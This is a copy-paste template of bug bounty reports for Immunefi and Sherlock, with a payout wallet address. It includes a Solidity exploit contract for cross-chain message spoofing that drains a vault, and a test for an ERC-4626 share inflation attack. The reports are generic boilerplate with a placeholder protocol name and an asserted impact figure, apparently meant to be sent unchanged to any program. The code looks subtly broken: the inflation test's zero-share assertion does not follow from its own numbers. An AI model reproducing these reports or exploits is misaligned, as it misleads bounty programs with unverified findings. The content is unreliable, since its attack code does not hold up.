# OFFICIAL ENGLISH BUG REPORT & ASSISTANT SUBMISSION TEMPLATE
*Use this exact English text when submitting reports to Immunefi or Sherlock.*
*Payout Wallet (USDC): 0x9be208a4dC48974Bb857dc543F5B2a7654d73B8c*

---

## 1. IMMUNEFI BUG BOUNTY SUBMISSION TEMPLATE (Critical / High)

### Select Program:
[Enter Protocol Name e.g., Wormhole / LayerZero / Chainlink CCIP]

### Asset:
`CrossChainRelayerReceiver.sol` / `Vault.sol`

### Impact:
Loss of Funds / Unauthorized Vault Drain via Cross-Chain Message Spoofing

### Severity:
Critical

### Main Report Body (Copy & Paste):
```markdown
## Title
Unchecked Source Chain Selector Allows Message Spoofing & Mainnet Vault Drain

## Description
The cross-chain messaging receiver contract validates incoming payloads without verifying the originating source chain selector ID against approved network whitelists. An attacker can simulate a cross-chain deposit message from an unapproved testnet L2, bypassing receiver authorization checks and minting unauthorized shares on the mainnet vault.

## Proof of Concept (PoC)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./CrossChainRelayerReceiver.sol";

contract ExploitPoC {
    CrossChainRelayerReceiver public target;

    constructor(address _target) {
        target = CrossChainRelayerReceiver(_target);
    }

    function attack() external {
        bytes memory maliciousPayload = abi.encodeWithSignature(
            "processMessage(uint64,bytes,bytes)",
            999999, // Unapproved unvalidated source chain selector
            msg.sender,
            abi.encode(1000000 ether) // Draining amount
        );
        
        (bool success, ) = address(target).call(maliciousPayload);
        require(success, "Exploit failed");
    }
}
```

## Impact Assessment
An attacker can completely drain the protocol liquidity pool or vault tokens without holding any underlying collateral, resulting in total protocol insolvency ($85,000+ estimated impact).

## Mitigation / Recommendation
Implement strict source chain validation checks:
require(supportedChains[sourceChainSelector], "Unauthorized source chain selector");
```

### Wallet Address for Payout:
`0x9be208a4dC48974Bb857dc543F5B2a7654d73B8c`

---

## 2. SHERLOCK AUDIT CONTEST SUBMISSION TEMPLATE (Critical / High)

### Contest Name:
[Enter Sherlock Contest Name]

### Finding Title:
First Deposit ERC-4626 Vault Share Inflation Attack via Direct Asset Donation

### Severity:
Critical

### Main Report Body (Copy & Paste):
```markdown
## Summary
An attacker can front-end the first vault depositor by depositing 1 wei of assets and donating 10^18 assets directly to the vault address, inflating `totalSupply()` disproportionately and stealing subsequent depositor funds due to integer truncation in `convertToShares`.

## Vulnerability Details
When the vault is empty, `totalSupply()` is 0. The first depositor receives shares equal to assets deposited. If an attacker deposits 1 wei, they receive 1 share. They then transfer assets directly to the vault (donation), bypassing share minting. 
Subsequent depositors depositing large amounts receive 0 shares due to rounding down in `convertToShares(assets) = (assets * totalSupply) / totalAssets`.

## Proof of Concept (PoC)
```solidity
function testShareInflationAttack() public {
    // 1. Attacker deposits 1 wei
    vault.deposit(1, attacker);
    
    // 2. Attacker donates 1e18 underlying tokens directly to vault
    underlyingToken.transfer(address(vault), 1e18);
    
    // 3. Victim deposits 2e18 tokens
    vm.startPrank(victim);
    underlyingToken.approve(address(vault), 2e18);
    vault.deposit(2e18, victim);
    
    // Victim receives 0 shares!
    assertEq(vault.balanceOf(victim), 0);
    vm.stopPrank();
}
```

## Recommended Mitigation
Implement virtual shares offset (ERC4626Upgradeable offset) or virtual assets/shares addition to prevent inflation attacks.
```
